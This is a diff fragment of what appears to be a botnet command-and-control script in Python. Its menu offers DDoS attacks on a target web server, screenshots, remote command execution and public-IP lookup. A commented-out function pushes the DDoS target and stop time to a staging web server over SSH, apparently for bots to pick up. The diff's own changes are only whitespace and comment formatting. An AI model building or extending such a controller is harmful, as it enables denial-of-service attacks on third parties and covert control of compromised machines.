@@ -45,7 +45,7 @@ def main():
 
     while (True):
         user_input = str(get_user_input("1) DDoS target web server\n2) Get screenshot\n3) Execute command\n4) Get public IP address\n5) Quit\n\nWhat do you want to do: "))
-        
+
         if (user_input == "1"): #ddos_target_web_server()
             ddos_target = str(get_user_input("What IP address do you want to target? "))
             ddos_stop_time = str(get_user_input("What time do you want to stop the DDoS attack (24-HOUR FORMAT (EXAMPLE: 14:30))? "))
@@ -78,7 +78,7 @@ def main():
 
 
 
-###---SYSTEM MODULES---###
+## SYSTEM MODULES ##
 def get_user_input(message):
     while (True):
         user_input = str(input(message))
@@ -125,12 +125,12 @@ def load_ssh_credentials():
     f = open("ssh_username.txt", "r")
     ssh_username = f.read()
     f.close()
-    
+
     return ssh_ip_address, ssh_port, ssh_username
 
 
 
-###---COMMAND MODULES---###
+## COMMAND MODULES ##
 #def ddos_target_web_server(ddos_target, ddos_stop_time, ssh_ip_address, ssh_port, ssh_username):
     #os.system("ssh " + ssh_username + "@" + ssh_ip_address + " -p " + ssh_port + " 'echo '2' > /var/www/website/tar1.html && echo '" + ddos_target + "' > /var/www/website/tar2.html && echo '" + ddos_stop_time + "' > /var/www/website/tar3.html && sudo -S systemctl restart nginx'")
 
